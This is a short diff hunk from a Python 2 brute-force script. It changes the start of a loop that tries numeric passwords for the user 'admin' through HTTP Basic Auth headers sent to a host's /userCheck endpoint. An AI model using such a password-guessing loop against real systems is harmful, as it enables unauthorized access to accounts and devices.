@@ -19,7 +19,7 @@ def do_brute(path):
     global password
     global host
 
-    for i in xrange(1000, 99999):
+    for i in xrange(0000, 99999):
 	header = base64.b64encode("admin:" + str(i))
         url = urllib2.Request("http://"+host+""+path+"/userCheck")
 	url.add_header('Authorization', "Basic " + header)
